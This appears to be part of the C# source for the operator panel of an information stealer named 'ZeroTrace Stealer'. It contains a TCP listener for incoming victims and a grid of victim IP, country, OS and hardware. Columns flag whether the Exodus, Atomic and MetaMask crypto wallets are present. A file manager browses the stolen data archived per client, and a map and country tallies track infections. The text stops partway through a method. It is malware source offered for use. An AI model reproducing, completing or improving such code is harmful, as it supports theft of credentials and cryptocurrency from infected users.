using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using DevExpress.XtraGrid.Views.Grid;
using DevExpress.XtraMap;
using Mono.Cecil;

namespace ZeroTrace_Stealer_Official
{
    public partial class Form1 : DevExpress.XtraBars.FluentDesignSystem.FluentDesignForm
    {

        private ConcurrentQueue<LogEntry> logQueue = new ConcurrentQueue<LogEntry>();
        private System.Windows.Forms.Timer logUpdateTimer;
        private int maxLogEntries = 1000; // Limit entries to prevent memory issues
        private bool autoScroll = true;
        private string currentPath = string.Empty;
        private string currentZipFile = string.Empty;
        private Stack<string> navigationHistory = new Stack<string>();
        private bool insideZip = false;
        private bool fileManagerInitialized = false;



        private GridView gridView;
        private DataTable clientsTable;
        private VectorItemsLayer clientsLayer;
        private Dictionary<string, GeoPoint> locationCache = new Dictionary<string, GeoPoint>();
        // TCP server properties
        private TcpListener tcpServer;
        private bool isServerRunning = false;
        private Thread serverThread;
        private List<ServerInstance> activeServers = new List<ServerInstance>();

        // Class to track each server instance
        private class ServerInstance
        {
            public int Port { get; set; }
            public TcpListener Listener { get; set; }
            public Thread ServerThread { get; set; }
        }
        private class LogEntry
        {
            public DateTime Timestamp { get; set; }
            public string Message { get; set; }
            public LogType Type { get; set; }

            public Color GetColor()
            {
                switch (Type)
                {
                    case LogType.Error: return Color.Red;
                    case LogType.Warning: return Color.Orange;
                    case LogType.Info: return Color.White;
                    case LogType.Connection: return Color.LightGreen;
                    case LogType.DataTransfer: return Color.LightBlue;
                    case LogType.Security: return Color.Yellow;
                    default: return Color.Gray;
                }
            }
        }


        // To this:
        public enum LogType
        {
            Info,
            Warning,
            Error,
            Connection,
            DataTransfer,
            Security,
            System
        }

        public Form1()
        {
            InitializeComponent();
            SetupGridControl();
            SetupMapControl();

            InitializeLogging();

            SetupResourceMonitor();
            SetupCountryStatsTimer();
        }







        private void SetupFileManager()
        {
            if (fileManagerInitialized)
                return;

            // Create data source
            DataTable fileTable = new DataTable();
            fileTable.Columns.Add("Name", typeof(string));
            fileTable.Columns.Add("Type", typeof(string));
            fileTable.Columns.Add("Size", typeof(string));
            fileTable.Columns.Add("Modified", typeof(DateTime));
            fileTable.Columns.Add("Path", typeof(string)); // Hidden column for internal use
            fileTable.Columns.Add("IsDirectory", typeof(bool)); // Hidden column for internal use
            fileTable.Columns.Add("IsZipEntry", typeof(bool)); // Hidden column for internal use

            // Configure the grid control
            gridControl3.DataSource = fileTable;

            // Configure grid view
            DevExpress.XtraGrid.Views.Grid.GridView gridView = gridControl3.MainView as DevExpress.XtraGrid.Views.Grid.GridView;
            if (gridView != null)
            {
                // Set appearance options
                gridView.OptionsBehavior.Editable = false;
                gridView.OptionsView.ShowGroupPanel = false;
                gridView.OptionsView.ShowIndicator = false;
                gridView.OptionsView.EnableAppearanceEvenRow = true;
                gridView.OptionsView.EnableAppearanceOddRow = true;

                // Configure columns
                gridView.Columns["Name"].Width = 250;
                gridView.Columns["Type"].Width = 100;
                gridView.Columns["Size"].Width = 80;
                gridView.Columns["Modified"].Width = 150;

                // Hide internal columns
                gridView.Columns["Path"].Visible = false;
                gridView.Columns["IsDirectory"].Visible = false;
                gridView.Columns["IsZipEntry"].Visible = false;

                // Format columns
                gridView.Columns["Modified"].DisplayFormat.FormatType = DevExpress.Utils.FormatType.DateTime;
                gridView.Columns["Modified"].DisplayFormat.FormatString = "MM/dd/yyyy";

                // Double click handler to navigate
                gridView.DoubleClick += (s, args) => {
                    // Get mouse position from Control class
                    Point mousePoint = gridControl3.PointToClient(Control.MousePosition);
                    var hitInfo = gridView.CalcHitInfo(mousePoint);

                    if (hitInfo.InRow && hitInfo.RowHandle >= 0)
                    {
                        string name = gridView.GetRowCellValue(hitInfo.RowHandle, "Name").ToString();
                        string path = gridView.GetRowCellValue(hitInfo.RowHandle, "Path").ToString();
                        bool isDirectory = Convert.ToBoolean(gridView.GetRowCellValue(hitInfo.RowHandle, "IsDirectory"));
                        bool isZipEntry = Convert.ToBoolean(gridView.GetRowCellValue(hitInfo.RowHandle, "IsZipEntry"));

                        if (name == "..")
                        {
                            NavigateBack();
                        }
                        else if (isDirectory && !isZipEntry)
                        {
                            NavigateToFolder(path);
                        }
                        else if (path.EndsWith(".zip", StringComparison.OrdinalIgnoreCase) && !isZipEntry)
                        {
                            NavigateToZipRoot(path);
                        }
                        else if (isDirectory && isZipEntry)
                        {
                            NavigateToZipFolder(currentZipFile, path);
                        }
                        else if (isZipEntry)
                        {
                            ExtractAndOpenFile(currentZipFile, path);
                        }
                        else
                        {
                            OpenFile(path);
                        }
                    }
                };

                // Add context menu
                gridView.PopupMenuShowing += (s, args) => {
                    if (args.HitInfo.InRow)
                    {
                        var menu = new DevExpress.XtraBars.PopupMenu();

                        // Add navigation commands
                        if (navigationHistory.Count > 0)
                        {
                            var backItem = new DevExpress.XtraBars.BarButtonItem(new DevExpress.XtraBars.BarManager(), "Back");
                            backItem.ItemClick += (sender, e) => NavigateBack();
                            menu.AddItem(backItem);
                        }

                        var refreshItem = new DevExpress.XtraBars.BarButtonItem(new DevExpress.XtraBars.BarManager(), "Refresh");
                        refreshItem.ItemClick += (sender, e) => {
                            if (insideZip)
                                NavigateToZipRoot(currentZipFile);
                            else
                                NavigateToFolder(currentPath);
                        };
                        menu.AddItem(refreshItem);

                        // If a row is selected, add item-specific commands
                        if (args.HitInfo.RowHandle >= 0)
                        {
                            string name = gridView.GetRowCellValue(args.HitInfo.RowHandle, "Name").ToString();
                            string path = gridView.GetRowCellValue(args.HitInfo.RowHandle, "Path").ToString();
                            bool isDirectory = Convert.ToBoolean(gridView.GetRowCellValue(args.HitInfo.RowHandle, "IsDirectory"));
                            bool isZipEntry = Convert.ToBoolean(gridView.GetRowCellValue(args.HitInfo.RowHandle, "IsZipEntry"));

                            if (name != "..")
                            {
                                var openItem = new DevExpress.XtraBars.BarButtonItem(new DevExpress.XtraBars.BarManager(), "Open");
                                openItem.ItemClick += (sender, e) => {
                                    if (isDirectory && !isZipEntry)
                                        NavigateToFolder(path);
                                    else if (path.EndsWith(".zip", StringComparison.OrdinalIgnoreCase) && !isZipEntry)
                                        NavigateToZipRoot(path);
                                    else if (isDirectory && isZipEntry)
                                        NavigateToZipFolder(currentZipFile, path);
                                    else if (isZipEntry)
                                        ExtractAndOpenFile(currentZipFile, path);
                                    else
                                        OpenFile(path);
                                };
                                menu.AddItem(openItem);

                                if (isZipEntry && !isDirectory)
                                {
                                    var extractItem = new DevExpress.XtraBars.BarButtonItem(new DevExpress.XtraBars.BarManager(), "Extract");
                                    extractItem.ItemClick += (sender, e) => ExtractFile(currentZipFile, path);
                                    menu.AddItem(extractItem);
                                }
                            }
                        }

                        menu.ShowPopup(Control.MousePosition);
                    }
                };
            }

            fileManagerInitialized = true;
        }

        private void NavigateToFolder(string folderPath)
        {
            try
            {
                // Save current path to history if not empty
                if (!string.IsNullOrEmpty(currentPath))
                {
                    navigationHistory.Push(currentPath);
                }

                // Update current path
                currentPath = folderPath;
                insideZip = false;
                currentZipFile = string.Empty;

                // Update window title to show current path
                this.Text = $"File Manager - {folderPath}";

                // Get the data table
                DataTable fileTable = gridControl3.DataSource as DataTable;
                fileTable.Rows.Clear();

                // Add back navigation entry if not at the root Clients folder
                string clientsFolder = Path.Combine(Application.StartupPath, "Clients");
                if (!string.Equals(folderPath, clientsFolder, StringComparison.OrdinalIgnoreCase))
                {
                    DataRow backRow = fileTable.NewRow();
                    backRow["Name"] = "..";
                    backRow["Type"] = "Directory";
                    backRow["Size"] = "";
                    backRow["Modified"] = DateTime.Now;
                    backRow["Path"] = Directory.GetParent(folderPath).FullName;
                    backRow["IsDirectory"] = true;
                    backRow["IsZipEntry"] = false;
                    fileTable.Rows.Add(backRow);
                }

                // Add directories
                foreach (string directory in Directory.GetDirectories(folderPath))
                {
                    DirectoryInfo dirInfo = new DirectoryInfo(directory);

                    DataRow row = fileTable.NewRow();
                    row["Name"] = dirInfo.Name;
                    row["Type"] = "Directory";
                    row["Size"] = "";
                    row["Modified"] = dirInfo.LastWriteTime;
                    row["Path"] = directory;
                    row["IsDirectory"] = true;
                    row["IsZipEntry"] = false;
                    fileTable.Rows.Add(row);
                }

                // Add files
                foreach (string file in Directory.GetFiles(folderPath))
                {
                    FileInfo fileInfo = new FileInfo(file);

                    DataRow row = fileTable.NewRow();
                    row["Name"] = fileInfo.Name;
                    row["Type"] = fileInfo.Extension.ToUpper().TrimStart('.');
                    row["Size"] = FormatAllASS(fileInfo.Length);
                    row["Modified"] = fileInfo.LastWriteTime;
                    row["Path"] = file;
                    row["IsDirectory"] = false;
                    row["IsZipEntry"] = false;
                    fileTable.Rows.Add(row);
                }

                // Refresh the grid
                gridControl3.RefreshDataSource();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error navigating to folder: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        private void NavigateToZipRoot(string zipFilePath)
        {
            try
            {
                // Save current path to history
                navigationHistory.Push(currentPath);

                // Update state
                currentPath = zipFilePath;
                currentZipFile = zipFilePath;
                insideZip = true;

                // Update window title
                this.Text = $"File Manager - {zipFilePath} (ZIP)";

                // Get the data table
                DataTable fileTable = gridControl3.DataSource as DataTable;
                fileTable.Rows.Clear();

                // Add back navigation entry
                DataRow backRow = fileTable.NewRow();
                backRow["Name"] = "..";
                backRow["Type"] = "Directory";
                backRow["Size"] = "";
                backRow["Modified"] = DateTime.Now;
                backRow["Path"] = Path.GetDirectoryName(zipFilePath);
                backRow["IsDirectory"] = true;
                backRow["IsZipEntry"] = false;
                fileTable.Rows.Add(backRow);

                // Open the ZIP file and list contents
                using (ZipArchive archive = ZipFile.OpenRead(zipFilePath))
                {
                    // Get unique directories at the root level
                    HashSet<string> rootDirs = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

                    foreach (ZipArchiveEntry entry in archive.Entries)
                    {
                        string entryPath = entry.FullName.Replace('\\', '/');

                        // Check if this is a file or directory at the root level
                        if (entryPath.Contains("/"))
                        {
                            // It's a file in a subdirectory or a subdirectory itself
                            string[] parts = entryPath.Split(new[] { '/' }, StringSplitOptions.RemoveEmptyEntries);
                            if (parts.Length > 0)
                            {
                                rootDirs.Add(parts[0]);
                            }
                        }
                        else if (!string.IsNullOrEmpty(entryPath))
                        {
                            // It's a file at the root level
                            DataRow row = fileTable.NewRow();
                            row["Name"] = entry.Name;
                            row["Type"] = Path.GetExtension(entry.Name).ToUpper().TrimStart('.');
                            row["Size"] = FormatAllASS(entry.Length);
                            row["Modified"] = entry.LastWriteTime.DateTime;
                            row["Path"] = entry.FullName;
                            row["IsDirectory"] = false;
                            row["IsZipEntry"] = true;
                            fileTable.Rows.Add(row);
                        }
                    }

                    // Add all unique root directories
                    foreach (string dir in rootDirs)
                    {
                        DataRow row = fileTable.NewRow();
                        row["Name"] = dir;
                        row["Type"] = "Directory";
                        row["Size"] = "";
                        row["Modified"] = DateTime.Now;
                        row["Path"] = dir;
                        row["IsDirectory"] = true;
                        row["IsZipEntry"] = true;
                        fileTable.Rows.Add(row);
                    }
                }

                // Refresh the grid
                gridControl3.RefreshDataSource();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error navigating to ZIP file: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        private void NavigateToZipFolder(string zipFilePath, string folderPath)
        {
            try
            {
                // Save current path to history
                navigationHistory.Push(currentPath);

                // Update state
                currentPath = folderPath;
                insideZip = true;

                // Update window title
                this.Text = $"File Manager - {zipFilePath} → {folderPath}";

                // Get the data table
                DataTable fileTable = gridControl3.DataSource as DataTable;
                fileTable.Rows.Clear();

                // Add back navigation entry
                DataRow backRow = fileTable.NewRow();
                backRow["Name"] = "..";
                backRow["Type"] = "Directory";
                backRow["Size"] = "";
                backRow["Modified"] = DateTime.Now;

                // Determine parent path
                folderPath = folderPath.Replace('\\', '/');
                if (folderPath.Contains("/"))
                {
                    string parentPath = Path.GetDirectoryName(folderPath)?.Replace('\\', '/');
                    if (string.IsNullOrEmpty(parentPath))
                    {
                        backRow["Path"] = zipFilePath; // Back to ZIP root
                        backRow["IsZipEntry"] = false;
                    }
                    else
                    {
                        backRow["Path"] = parentPath;
                        backRow["IsZipEntry"] = true;
                    }
                }
                else
                {
                    backRow["Path"] = zipFilePath; // Back to ZIP root
                    backRow["IsZipEntry"] = false;
                }

                backRow["IsDirectory"] = true;
                fileTable.Rows.Add(backRow);

                // Open the ZIP file and list contents of the folder
                using (ZipArchive archive = ZipFile.OpenRead(zipFilePath))
                {
                    string folderPrefix = folderPath + "/";
                    HashSet<string> subDirs = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

                    foreach (ZipArchiveEntry entry in archive.Entries)
                    {
                        string entryPath = entry.FullName.Replace('\\', '/');

                        if (entryPath.StartsWith(folderPrefix, StringComparison.OrdinalIgnoreCase))
                        {
                            string relativePath = entryPath.Substring(folderPrefix.Length);

                            if (string.IsNullOrEmpty(relativePath))
                            {
                                // This is the folder entry itself, skip it
                                continue;
                            }

                            if (relativePath.Contains("/"))
                            {
                                // This is a file in a subdirectory or a subdirectory
                                string[] parts = relativePath.Split(new[] { '/' }, StringSplitOptions.RemoveEmptyEntries);
                                if (parts.Length > 0)
                                {
                                    subDirs.Add(parts[0]);
                                }
                            }
                            else
                            {
                                // This is a file in the current directory
                                DataRow row = fileTable.NewRow();
                                row["Name"] = relativePath;
                                row["Type"] = Path.GetExtension(relativePath).ToUpper().TrimStart('.');
                                row["Size"] = FormatAllASS(entry.Length);
                                row["Modified"] = entry.LastWriteTime.DateTime;
                                row["Path"] = entry.FullName;
                                row["IsDirectory"] = false;
                                row["IsZipEntry"] = true;
                                fileTable.Rows.Add(row);
                            }
                        }
                    }

                    // Add subdirectories
                    foreach (string dir in subDirs)
                    {
                        DataRow row = fileTable.NewRow();
                        row["Name"] = dir;
                        row["Type"] = "Directory";
                        row["Size"] = "";
                        row["Modified"] = DateTime.Now;
                        row["Path"] = folderPrefix + dir;
                        row["IsDirectory"] = true;
                        row["IsZipEntry"] = true;
                        fileTable.Rows.Add(row);
                    }
                }

                // Refresh the grid
                gridControl3.RefreshDataSource();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error navigating to ZIP folder: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        private void NavigateBack()
        {
            try
            {
                if (navigationHistory.Count > 0)
                {
                    string previousPath = navigationHistory.Pop();

                    if (previousPath.EndsWith(".zip", StringComparison.OrdinalIgnoreCase) && !insideZip)
                    {
                        NavigateToZipRoot(previousPath);
                    }
                    else if (insideZip && !previousPath.EndsWith(".zip", StringComparison.OrdinalIgnoreCase))
                    {
                        // Going from inside a ZIP to a regular folder
                        NavigateToFolder(previousPath);
                    }
                    else if (insideZip)
                    {
                        // We're inside a ZIP folder, going to parent folder in the ZIP
                        NavigateToZipFolder(currentZipFile, previousPath);
                    }
                    else
                    {
                        // Regular folder navigation
                        NavigateToFolder(previousPath);
                    }
                }
                else if (insideZip)
                {
                    // If we're inside a ZIP but history is empty, go to the ZIP's containing folder
                    string zipFolder = Path.GetDirectoryName(currentZipFile);
                    if (!string.IsNullOrEmpty(zipFolder))
                    {
                        NavigateToFolder(zipFolder);
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error navigating back: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void ExtractAndOpenFile(string zipFilePath, string entryPath)
        {
            try
            {
                // Create a temporary directory
                string tempDir = Path.Combine(Path.GetTempPath(), "ZeroTrace_FileManager");
                Directory.CreateDirectory(tempDir);

                // Create a unique filename for extraction
                string fileName = Path.GetFileName(entryPath);
                string targetPath = Path.Combine(tempDir, fileName);

                // If the file already exists, use a unique name
                if (File.Exists(targetPath))
                {
                    targetPath = Path.Combine(tempDir, $"{Path.GetFileNameWithoutExtension(fileName)}_{DateTime.Now.Ticks}{Path.GetExtension(fileName)}");
                }

                // Extract the file
                using (ZipArchive archive = ZipFile.OpenRead(zipFilePath))
                {
                    ZipArchiveEntry entry = archive.GetEntry(entryPath);
                    if (entry != null)
                    {
                        entry.ExtractToFile(targetPath, true);

                        // Open the file
                        Process.Start(new ProcessStartInfo
                        {
                            FileName = targetPath,
                            UseShellExecute = true
                        });
                    }
                    else
                    {
                        MessageBox.Show($"Entry not found: {entryPath}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error extracting and opening file: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void ExtractFile(string zipFilePath, string entryPath)
        {
            try
            {
                // Ask the user for a save location
                SaveFileDialog saveDialog = new SaveFileDialog
                {
                    FileName = Path.GetFileName(entryPath),
                    Filter = "All Files (*.*)|*.*"
                };

                if (saveDialog.ShowDialog() == DialogResult.OK)
                {
                    using (ZipArchive archive = ZipFile.OpenRead(zipFilePath))
                    {
                        ZipArchiveEntry entry = archive.GetEntry(entryPath);
                        if (entry != null)
                        {
                            entry.ExtractToFile(saveDialog.FileName, true);
                            MessageBox.Show($"File extracted to: {saveDialog.FileName}", "Extraction Complete", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        }
                        else
                        {
                            MessageBox.Show($"Entry not found: {entryPath}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error extracting file: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        private void OpenFile(string filePath)
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = filePath,
                    UseShellExecute = true
                });
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error opening file: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private string FormatAllASS(long bytes)
        {
            string[] sizes = { "B", "KB", "MB", "GB", "TB" };
            double len = bytes;
            int order = 0;

            while (len >= 1024 && order < sizes.Length - 1)
            {
                order++;
                len = len / 1024;
            }

            return $"{len:0.##} {sizes[order]}";
        }



        private void ShowProperties(string path, bool isZipEntry)
        {
            try
            {
                // Create a simple properties dialog
                Form propertiesForm = new Form
                {
                    Text = "File Properties",
                    Size = new Size(400, 300),
                    FormBorderStyle = FormBorderStyle.FixedDialog,
                    StartPosition = FormStartPosition.CenterParent,
                    MaximizeBox = false,
                    MinimizeBox = false
                };

                // Create a TableLayoutPanel for the properties
                TableLayoutPanel panel = new TableLayoutPanel
                {
                    Dock = DockStyle.Fill,
                    Padding = new Padding(10),
                    RowCount = 6,
                    ColumnCount = 2,
                    ColumnStyles = {
                new ColumnStyle(SizeType.Percent, 30F),
                new ColumnStyle(SizeType.Percent, 70F)
            }
                };

                // Add properties
                panel.Controls.Add(new Label { Text = "Name:", Dock = DockStyle.Fill }, 0, 0);
                panel.Controls.Add(new Label { Text = Path.GetFileName(path), Dock = DockStyle.Fill }, 1, 0);

                panel.Controls.Add(new Label { Text = "Location:", Dock = DockStyle.Fill }, 0, 1);
                panel.Controls.Add(new Label { Text = isZipEntry ? currentZipFile : Path.GetDirectoryName(path), Dock = DockStyle.Fill }, 1, 1);

                if (isZipEntry)
                {
                    // Show ZIP entry properties
                    using (ZipArchive archive = ZipFile.OpenRead(currentZipFile))
                    {
                        ZipArchiveEntry entry = archive.GetEntry(path);
                        if (entry != null)
                        {
                            panel.Controls.Add(new Label { Text = "Size:", Dock = DockStyle.Fill }, 0, 2);
                            panel.Controls.Add(new Label { Text = FormatFileSize(entry.Length), Dock = DockStyle.Fill }, 1, 2);

                            panel.Controls.Add(new Label { Text = "Modified:", Dock = DockStyle.Fill }, 0, 3);
                            panel.Controls.Add(new Label { Text = entry.LastWriteTime.DateTime.ToString(), Dock = DockStyle.Fill }, 1, 3);

                            panel.Controls.Add(new Label { Text = "Compressed Size:", Dock = DockStyle.Fill }, 0, 4);
                            panel.Controls.Add(new Label { Text = FormatFileSize(entry.CompressedLength), Dock = DockStyle.Fill }, 1, 4);

                            panel.Controls.Add(new Label { Text = "Compression Ratio:", Dock = DockStyle.Fill }, 0, 5);
                            panel.Controls.Add(new Label { Text = entry.Length > 0 ? $"{(1 - (double)entry.CompressedLength / entry.Length) * 100:F1}%" : "0%", Dock = DockStyle.Fill }, 1, 5);
                        }
                    }
                }
                else
                {
                    // Show file system properties
                    if (File.Exists(path))
                    {
                        FileInfo fileInfo = new FileInfo(path);

                        panel.Controls.Add(new Label { Text = "Size:", Dock = DockStyle.Fill }, 0, 2);
                        panel.Controls.Add(new Label { Text = FormatFileSize(fileInfo.Length), Dock = DockStyle.Fill }, 1, 2);

                        panel.Controls.Add(new Label { Text = "Created:", Dock = DockStyle.Fill }, 0, 3);
                        panel.Controls.Add(new Label { Text = fileInfo.CreationTime.ToString(), Dock = DockStyle.Fill }, 1, 3);

                        panel.Controls.Add(new Label { Text = "Modified:", Dock = DockStyle.Fill }, 0, 4);
                        panel.Controls.Add(new Label { Text = fileInfo.LastWriteTime.ToString(), Dock = DockStyle.Fill }, 1, 4);

                        panel.Controls.Add(new Label { Text = "Attributes:", Dock = DockStyle.Fill }, 0, 5);
                        panel.Controls.Add(new Label { Text = fileInfo.Attributes.ToString(), Dock = DockStyle.Fill }, 1, 5);
                    }
                    else if (Directory.Exists(path))
                    {
                        DirectoryInfo dirInfo = new DirectoryInfo(path);

                        panel.Controls.Add(new Label { Text = "Type:", Dock = DockStyle.Fill }, 0, 2);
                        panel.Controls.Add(new Label { Text = "Directory", Dock = DockStyle.Fill }, 1, 2);

                        panel.Controls.Add(new Label { Text = "Created:", Dock = DockStyle.Fill }, 0, 3);
                        panel.Controls.Add(new Label { Text = dirInfo.CreationTime.ToString(), Dock = DockStyle.Fill }, 1, 3);

                        panel.Controls.Add(new Label { Text = "Modified:", Dock = DockStyle.Fill }, 0, 4);
                        panel.Controls.Add(new Label { Text = dirInfo.LastWriteTime.ToString(), Dock = DockStyle.Fill }, 1, 4);

                        panel.Controls.Add(new Label { Text = "Attributes:", Dock = DockStyle.Fill }, 0, 5);
                        panel.Controls.Add(new Label { Text = dirInfo.Attributes.ToString(), Dock = DockStyle.Fill }, 1, 5);
                    }
                }

                propertiesForm.Controls.Add(panel);

                // Add OK button
                Button okButton = new Button
                {
                    Text = "OK",
                    DialogResult = DialogResult.OK,
                    Anchor = AnchorStyles.Bottom | AnchorStyles.Right,
                    Location = new Point(propertiesForm.ClientSize.Width - 85, propertiesForm.ClientSize.Height - 40),
                    Size = new Size(75, 25)
                };
                propertiesForm.Controls.Add(okButton);
                propertiesForm.AcceptButton = okButton;

                // Show the form
                propertiesForm.ShowDialog();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error showing properties: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void UpdatePathLabel(string path)
        {
            // Find the path label in the toolbar
            foreach (Control control in gridControl3.Parent.Controls)
            {
                if (control is Panel panel)
                {
                    foreach (Control panelControl in panel.Controls)
                    {
                        if (panelControl is Label label && label.BorderStyle == BorderStyle.FixedSingle)
                        {
                            label.Text = path;
                            return;
                        }
                    }
                }
            }
        }

        private string FormatMyAss(long bytes)
        {
            string[] sizes = { "B", "KB", "MB", "GB", "TB" };
            double len = bytes;
            int order = 0;

            while (len >= 1024 && order < sizes.Length - 1)
            {
                order++;
                len = len / 1024;
            }

            return $"{len:0.##} {sizes[order]}";
        }


        private void InitializeLogging()
        {
            // Setup the rich text box
            richTextBox1.BackColor = Color.Black;
            richTextBox1.ForeColor = Color.White;
            richTextBox1.Font = new Font("Consolas", 9F, FontStyle.Regular);
            richTextBox1.ReadOnly = true;

            // Setup timer for batch processing logs (more efficient than updating on every log)
            logUpdateTimer = new System.Windows.Forms.Timer();
            logUpdateTimer.Interval = 500; // Update every half second
            logUpdateTimer.Tick += ProcessLogQueue;
            logUpdateTimer.Start();

            // Write initial message
            LogToMonitor("Traffic monitoring initialized", LogType.System);
            LogToMonitor("Server ready. Click 'Start Listening' to begin.", LogType.Info);
        }


        public void LogToMonitor(string message, LogType type)
        {
            // Add to queue instead of directly updating UI
            logQueue.Enqueue(new LogEntry
            {
                Timestamp = DateTime.Now,
                Message = message,
                Type = type
            });

            // Don't let the queue grow too large
            if (logQueue.Count > maxLogEntries * 2)
            {
                // Emergency cleanup if queue gets too big
                LogEntry dummy;
                while (logQueue.Count > maxLogEntries && logQueue.TryDequeue(out dummy))
                {
                    // Just removing excess entries
                }
            }
        }


        private void ProcessLogQueue(object sender, EventArgs e)
        {
            if (logQueue.IsEmpty)
                return;

            // Check if we need to trim the text in the rich text box
            if (richTextBox1.Lines.Length > maxLogEntries)
            {
                richTextBox1.SuspendLayout();
                int cutoff = richTextBox1.GetFirstCharIndexFromLine(richTextBox1.Lines.Length - maxLogEntries);
                richTextBox1.Select(0, cutoff);
                richTextBox1.SelectedText = "";
                richTextBox1.ResumeLayout();
            }

            // Process up to 100 logs at a time to prevent UI freeze
            int processCount = Math.Min(100, logQueue.Count);
            if (processCount == 0)
                return;

            // Build a batch of log entries for efficiency
            richTextBox1.SuspendLayout();
            bool wasAtBottom = IsRichTextBoxScrolledToBottom();

            StringBuilder batch = new StringBuilder();
            for (int i = 0; i < processCount; i++)
            {
                if (logQueue.TryDequeue(out LogEntry entry))
                {
                    // Format: [Time] Message
                    string timestamp = entry.Timestamp.ToString("HH:mm:ss.fff");
                    string formatted = $"[{timestamp}] {entry.Message}\n";

                    // Append to rich text box with color
                    int startIndex = richTextBox1.TextLength;
                    richTextBox1.AppendText(formatted);
                    richTextBox1.Select(startIndex, formatted.Length);
                    richTextBox1.SelectionColor = entry.GetColor();
                    richTextBox1.SelectionLength = 0; // Deselect
                }
            }

            // Auto-scroll if was at bottom before
            if (wasAtBottom && autoScroll)
            {
                richTextBox1.SelectionStart = richTextBox1.Text.Length;
                richTextBox1.ScrollToCaret();
            }

            richTextBox1.ResumeLayout();
        }

        private bool IsRichTextBoxScrolledToBottom()
        {
            // No need for complex calculations, just use a simple approximation
            return richTextBox1.SelectionStart >= richTextBox1.Text.Length - 10;
        }
        private void Form1_Load(object sender, EventArgs e)
        {
      
            // Register cleanup handler
            this.FormClosing += (s, args) => CleanupResourceMonitor();
        }



        private void SetupGridControl()
        {
            // Create DataTable with columns
            clientsTable = new DataTable("Clients");
            clientsTable.Columns.Add("IP", typeof(string));
            clientsTable.Columns.Add("Country", typeof(string));
            clientsTable.Columns.Add("OS", typeof(string));
            clientsTable.Columns.Add("GPU", typeof(string));
            clientsTable.Columns.Add("CPU", typeof(string));
            clientsTable.Columns.Add("Exists1", typeof(bool));
            clientsTable.Columns.Add("Exists2", typeof(bool));
            clientsTable.Columns.Add("Exists3", typeof(bool));

            // Bind DataTable to GridControl
            gridControl1.DataSource = clientsTable;

            // Configure GridView
            gridView = gridControl1.MainView as GridView;
            gridView.OptionsBehavior.Editable = false;
            gridView.OptionsSelection.EnableAppearanceFocusedCell = false;

            // Set column captions for crypto wallets
            gridView.Columns["IP"].Caption = "IP Address";
            gridView.Columns["Exists1"].Caption = "Exodus";
            gridView.Columns["Exists2"].Caption = "Atomic";
            gridView.Columns["Exists3"].Caption = "MetaMask";

            // Set column widths
            gridView.Columns["IP"].Width = 120;
            gridView.Columns["Country"].Width = 100;
            gridView.Columns["OS"].Width = 100;
            gridView.Columns["GPU"].Width = 150;
            gridView.Columns["CPU"].Width = 150;

            // Handle grid row selection
            gridView.FocusedRowChanged += GridView_FocusedRowChanged;
        }
        private void GridView_FocusedRowChanged(object sender, DevExpress.XtraGrid.Views.Base.FocusedRowChangedEventArgs e)
        {
            if (e.FocusedRowHandle >= 0)
            {
                // Highlight the selected client on the map
                string ip = gridView.GetRowCellValue(e.FocusedRowHandle, "IP").ToString();
                HighlightClientOnMap(ip);
            }
        }

        private void HighlightClientOnMap(string ip)
        {
            if (clientsLayer?.Data is MapItemStorage storage)
            {
                foreach (MapItem item in storage.Items)
                {
                    if (item.Tag != null && item.Tag.ToString() == ip)
                    {
                        // Highlight this item
                        if (item is MapBubble bubble)
                        {
                            
                        }
                    }
                    else
                    {
                        // Reset other items
                        if (item is MapBubble bubble)
                        {
                            bubble.StrokeWidth = 1;
                            bubble.Stroke = Color.White;
                        }
                    }
                }
            }
        }
        private void UpdateCountryStats()
        {
            // This should run on the UI thread
            if (InvokeRequired)
            {
                Invoke(new Action(UpdateCountryStats));
                return;
            }

            try
            {
                // Create a dictionary to count countries
                Dictionary<string, int> countryCounts = new Dictionary<string, int>(StringComparer.OrdinalIgnoreCase);

                // Initialize with zero for all countries we're tracking
                countryCounts["USA"] = 0;
                countryCounts["Italy"] = 0;
                countryCounts["Canada"] = 0;
                countryCounts["Germany"] = 0;
                countryCounts["Romania"] = 0;
                countryCounts["Sweden"] = 0;
                countryCounts["Denmark"] = 0;
                countryCounts["France"] = 0;
                countryCounts["China"] = 0;
                countryCounts["Ukraine"] = 0;
                countryCounts["Japan"] = 0;
                countryCounts["Vietnam"] = 0;
                countryCounts["Turkey"] = 0;
                countryCounts["India"] = 0;
                countryCounts["Brasil"] = 0;
                countryCounts["Brazil"] = 0; // Alternative spelling
                countryCounts["Spain"] = 0;
                countryCounts["Portugal"] = 0;
                countryCounts["Argentina"] = 0;
                countryCounts["Mexico"] = 0;
                countryCounts["Nigeria"] = 0;
                countryCounts["Other"] = 0;

                // Count clients by country using the DataTable for better performance
